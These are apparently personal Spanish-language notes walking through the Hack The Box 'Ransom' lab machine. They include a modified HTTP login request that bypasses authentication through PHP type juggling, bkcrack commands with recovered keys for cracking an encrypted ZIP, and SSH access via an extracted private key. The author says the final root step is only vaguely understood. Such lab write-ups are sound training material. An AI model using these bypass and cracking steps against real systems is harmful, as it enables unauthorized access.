maquina ransom htb-------------------linux 

aprendizaje 

JSON
Laravel
Web
Vulnerability Assessment
Cryptography
Authentication
Web API
Javascript
Penetration Tester Level 2
Reconnaissance
Password Cracking
Information Disclosure
Weak Cryptography
Hard-coded Credentials
PHP type juggling

---------------------------------------------------


esta maquina vemos que tiene un login nada mas entrar podemos ver que a la hora de lanzar 
diferentes tipos de enumeracion no nos arroja demasiada info para poder entrar 

viendo un writeup podemos ver que podemos modificar todo en burpsuite para poder ver que es 
loque le lanza a la pagina

el metodo que hemos utilizado es el siguiente por pasos

1. hemos cambiado el metodo de respuesta (boton derecho) 
2. hemos cambiado el POST por GET 
3. hemos cambiado el formulario de respuesta urlencoded a Json 
4. hemos cambiado tambien la respuesta formulandola en formato json

aqui el ejemplo completo de la recibida y la respuesta mandada. 

------------------------------
RECIBIDA
-------------------------------

GET /api/login?password=loquesea HTTP/1.1

Host: 10.10.11.153

Accept: */*

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36

X-Requested-With: XMLHttpRequest

Referer: http://10.10.11.153/login

Accept-Encoding: gzip, deflate

Accept-Language: es-ES,es;q=0.9

Cookie: XSRF-TOKEN=eyJpdiI6ImlZbStRL05HL09BbzRyTGF6UjJCenc9PSIsInZhbHVlIjoiQzhweEFtcXVyczdEalhLWTFqOVkrZFQ0Ty9haXJHdi8zMURwNmdDSlI3WVdpSU1ERUNvZHcvRWJYN0xkUjJpQlRDLzdnVkRTSkF5Um1Rckx4aUNZWmcxYkpIUnRlYzlPNnJndEVhakVWZnVtVnNTeWtFUlRkWTJHTDkvSEtESWQiLCJtYWMiOiIxYjA0NzVlZjdmMzUwNDBlODEzOTM4MzdlMGZhODQ4ODExNmRhZjJhOWY1OTEzNTVlYjBmZTA2ZmE3YjUwY2NiIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6Ikk4SkFWMkNNNEdjcWdlanRscUw5Z1E9PSIsInZhbHVlIjoiOFdtbUxiYXhaZktIblA1Vm1TV3A2dG5XN2FrYk5YQm9sWmNCVmRIa283Q3RNVFZINitiRFFUZklaanBxTUdoaTNaYk11U2tKY0JLWm93MDRSdjdjcjVrbW04MlVteXRpQjBFTUR2RjljYk9iNEZKWXY1T0x1UHp4cm1aNVkvbzMiLCJtYWMiOiJiMTA0Y2U3ZWFlMmZlNWY0NGI1ZmJjZjhjNWVmZjlhYjY4NDBhMzc4NTc1NDg5OTIwZWVmM2I5YTI1YzE4ZTdjIiwidGFnIjoiIn0%3D

Connection: close



-------------------------------------------------
RESPUESTA
-------------------------------------------

GET /api/login HTTP/1.1

Host: 10.10.11.153

Accept: */*

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36

X-Requested-With: XMLHttpRequest

Referer: http://10.10.11.153/login

Accept-Encoding: gzip, deflate

Accept-Language: es-ES,es;q=0.9

Cookie: XSRF-TOKEN=eyJpdiI6ImlZbStRL05HL09BbzRyTGF6UjJCenc9PSIsInZhbHVlIjoiQzhweEFtcXVyczdEalhLWTFqOVkrZFQ0Ty9haXJHdi8zMURwNmdDSlI3WVdpSU1ERUNvZHcvRWJYN0xkUjJpQlRDLzdnVkRTSkF5Um1Rckx4aUNZWmcxYkpIUnRlYzlPNnJndEVhakVWZnVtVnNTeWtFUlRkWTJHTDkvSEtESWQiLCJtYWMiOiIxYjA0NzVlZjdmMzUwNDBlODEzOTM4MzdlMGZhODQ4ODExNmRhZjJhOWY1OTEzNTVlYjBmZTA2ZmE3YjUwY2NiIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6Ikk4SkFWMkNNNEdjcWdlanRscUw5Z1E9PSIsInZhbHVlIjoiOFdtbUxiYXhaZktIblA1Vm1TV3A2dG5XN2FrYk5YQm9sWmNCVmRIa283Q3RNVFZINitiRFFUZklaanBxTUdoaTNaYk11U2tKY0JLWm93MDRSdjdjcjVrbW04MlVteXRpQjBFTUR2RjljYk9iNEZKWXY1T0x1UHp4cm1aNVkvbzMiLCJtYWMiOiJiMTA0Y2U3ZWFlMmZlNWY0NGI1ZmJjZjhjNWVmZjlhYjY4NDBhMzc4NTc1NDg5OTIwZWVmM2I5YTI1YzE4ZTdjIiwidGFnIjoiIn0%3D

Connection: close

Content-Type: application/json

Content-Length: 17



{

	"password": true

}
------------------------------------------------------


se puede apreciar los cambios que hemos mencionado en las respuestas para que nos devuelva 
que la contraseña es correcta. 

tenemos la flag de user ahi, pero lo interesante viene despues en el archivo zip que nos hemos descargado

para poder ver el interior con un unzip del mismo aunque no se pueda descomprimir con el comando unzip es suficiente

para poder ver un poco mas den detalle con el comando 

7z -l <nombre archivo> 

una vez vemos el interior vamos a utilizar una herramienta para poder sacar el interior, la herramienta fucniona de la 
siguiente manera 

compara los archivos que tenga un zip encriptado con uno que no, e intenta sacar lo que hay dentro 

la herramienta te arroja 3 contraseñas y con eso puedes crear otro archivo identico al encriptado pero con tu password 

para poder sacar las contraeñas que luego utilizaremos hemos lanzado este comando 

bkcrack -P carapija.zip -p ".bash_logout" -C uploaded-file-3422.zip -c ".bash_logout" 

y para poder crear un archivo zip identico pero con tu contra es este 

bkcrack -C uploaded-file-3422.zip  -k 7b549874 ebc25ec5 7e465e18 -U carapija2.zip 1234

(mira los parametros dentro del help de la herramienta) 

una vez hemos sacado eso podemos entrar al ssh viendo el nombre del user en el id_rsa.pub 
y con el id_rsa podemos indicarle a la herramienta ssh que queremos ese archivo para poder entrar

ssh -i <nombre archivo id_rsa> htb@10.10.10.10 y listo 

una vez hemos entrado a la maquina hemos lanzado lo tipico para ver capavilitis y par apoder ver binario 

podemos entrar por PwnKit pero hemos ido por otro camino 

hemos mirado en la carpeta /etc/apache2/ y hemos descubierto un archivo que 
tiene un archivo 000-dafault que te da una ruta para poder ver donde esta montado el apache 

con la heramienta grep hemos visto que hay un archivo por arte de magia que nos da un AunthContoller

grep -R login

find /-name *AuthController* 

eso nos arroja un archivo que es PHP para poder ver la contraseña, que es la que da acceso a root 

esta parte final esta explicada un poco escueta porque no me ha quedado muy claro el tema

